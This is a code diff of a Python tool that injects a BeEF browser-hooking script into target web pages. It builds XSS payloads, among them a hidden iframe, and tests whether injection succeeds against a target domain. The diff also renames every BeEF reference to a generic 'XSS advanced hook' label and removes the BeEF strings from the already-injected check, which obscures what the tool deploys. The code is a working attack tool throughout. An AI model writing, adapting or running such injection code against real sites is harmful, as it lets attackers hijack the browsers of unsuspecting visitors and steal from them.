@@ -2,9 +2,9 @@ import requests
 import re
 from urllib.parse import urljoin, urlparse
 
-class BeEFInjector:
-    def __init__(self, beef_hook_url="http://localhost:3000/hook.js"):
-        self.beef_hook_url = beef_hook_url
+class XSSAdvancedInjector:
+    def __init__(self, hook_url="http://localhost:3000/hook.js"):
+        self.hook_url = hook_url
         self.injected_urls = []
     
     def inject_hook(self, target_url):
@@ -25,7 +25,7 @@ class BeEFInjector:
                 "url": target_url,
                 "original_size": len(html_content),
                 "modified_size": len(modified_html),
-                "hook_url": self.beef_hook_url
+                "hook_url": self.hook_url
             }
             
         except Exception as e:
@@ -33,10 +33,9 @@ class BeEFInjector:
     
     def _is_hook_already_injected(self, html_content):
         hook_patterns = [
-            r'beef\.js',
             r'hook\.js',
             r'localhost:3000',
-            r'beef_hook'
+            r'advanced_hook'
         ]
         
         for pattern in hook_patterns:
@@ -45,7 +44,7 @@ class BeEFInjector:
         return False
     
     def _inject_hook_into_html(self, html_content):
-        hook_script = f'<script src="{self.beef_hook_url}"></script>'
+        hook_script = f'<script src="{self.hook_url}"></script>'
         
         if '</head>' in html_content:
             return html_content.replace('</head>', f'{hook_script}\n</head>')
@@ -103,17 +102,17 @@ class BeEFInjector:
     
     def create_injection_payload(self, target_url, payload_type="hook"):
         payloads = {
-            "hook": f'<script src="{self.beef_hook_url}"></script>',
+            "hook": f'<script src="{self.hook_url}"></script>',
             "alert": '<script>alert("XSS Test");</script>',
             "console": '<script>console.log("Injection successful");</script>',
-            "iframe": f'<iframe src="{self.beef_hook_url}" style="display:none;"></iframe>'
+            "iframe": f'<iframe src="{self.hook_url}" style="display:none;"></iframe>'
         }
         
         return {
             "target_url": target_url,
             "payload_type": payload_type,
             "payload": payloads.get(payload_type, payloads["hook"]),
-            "hook_url": self.beef_hook_url
+            "hook_url": self.hook_url
         }
     
     def test_injection(self, target_url, payload):
@@ -129,8 +128,8 @@ class BeEFInjector:
         except Exception as e:
             return {"status": "error", "url": target_url, "error": str(e)}
 
-def inject_beef_hook(target_domain):
-    injector = BeEFInjector()
+def inject_xss_advanced_hook(target_domain):
+    injector = XSSAdvancedInjector()
     
     results = {
         "target": target_domain,
@@ -152,14 +151,13 @@ def inject_beef_hook(target_domain):
     for i, page in enumerate(injectable_pages, 1):
         print(f"  {i}. {page['url']} ({page['type']})")
     
-    # Ask for user confirmation
     while True:
-        user_input = input("\nDo you want to inject BeEF hook? (y/n): ").lower().strip()
+        user_input = input("\nDo you want to inject XSS advanced hook? (y/n): ").lower().strip()
         if user_input in ['y', 'yes']:
-            print("Proceeding with BeEF hook injection...")
+            print("Proceeding with XSS advanced hook injection...")
             break
         elif user_input in ['n', 'no']:
-            print("BeEF hook injection cancelled by user.")
+            print("XSS advanced hook injection cancelled by user.")
             return results
         else:
             print("Please enter 'y' for yes or 'n' for no.")
